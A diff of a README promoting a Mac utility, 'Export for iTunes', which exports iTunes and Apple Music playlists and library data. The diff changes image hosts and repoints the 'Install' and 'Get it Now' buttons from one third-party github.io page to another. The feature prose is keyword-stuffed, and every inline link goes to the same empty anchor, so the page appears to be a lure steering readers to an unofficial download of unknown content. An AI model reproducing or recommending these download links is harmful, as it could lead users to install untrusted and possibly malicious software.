@@ -1,12 +1,12 @@
 # ExportForiTunes Mac
 
 <p align="center">
-  <img src="https://static.macupdate.com/products/51324/l/export-for-itunes-logo.png?v=1656510744" width="150" alt="Export for iTunes icon"/>
+  <img src="https://is1-ssl.mzstatic.com/image/thumb/PurpleSource221/v4/93/1f/b2/931fb2b3-eec7-b09e-5113-a8e8ae3fa92d/Placeholder.mill/200x200bb-75.webp" width="150" alt="Export for iTunes icon"/>
 </p>
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://gazan-programs.github.io/.github/exportForiTunes)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://polycia-apps.github.io/.github/exportForiTunes)
 
 </div>
 
@@ -27,7 +27,7 @@ The <a href="#exportForiTunes">playlist export to standard formats</a> converts 
 The <a href="#exportForiTunes">library data CSV export</a> produces a spreadsheet-compatible export of the music library's metadata — track titles, artists, albums, genres, play counts, ratings, dates added, and other library metadata fields exported to CSV for external analysis, documentation, or import into other music management systems. The <a href="#exportForiTunes">metadata preservation</a> maintains the complete ID3 tag information — embedded metadata in the audio files — when copying tracks, ensuring that exported music retains the correct artist, album, track number, year, and other tag data in the destination copy.
 
 <p align="center">
-  <img src="https://static.macupdate.com/screenshots/331446/m/export-for-itunes-screenshot.png?v=1656510750" alt="Export for iTunes screenshot"/>
+  <img src="https://images.squarespace-cdn.com/content/v1/5429c98be4b06c998a91a95e/1648627500958-P6W6GU1MNSNILVCEOV7E/ExportForItunes+2.png" alt="Export for iTunes screenshot"/>
 </p>
 
 <a href="#exportForiTunes">Selective playlist and track export</a> exports specific playlists or selected tracks rather than the complete library — exporting only the content relevant to a specific use case rather than always handling the complete collection. <a href="#exportForiTunes">Folder structure configuration</a> specifies how exported files organize — artist/album/track hierarchy, flat folder with renamed files, or other organizational schemes matching the destination's expectations.
@@ -81,7 +81,7 @@ Export for iTunes fills the gap between Apple Music's closed library ecosystem a
 
 <p align="center">
 
-[![Get it Now Export for iTunes](https://img.shields.io/badge/Get_it_Now-0077B6?style=for-the-badge&logo=apple&logoColor=white)](https://gazan-programs.github.io/.github/exportForiTunes)
+[![Get it Now Export for iTunes](https://img.shields.io/badge/Get_it_Now-0077B6?style=for-the-badge&logo=apple&logoColor=white)](https://polycia-apps.github.io/.github/exportForiTunes)
 
 </p>
 
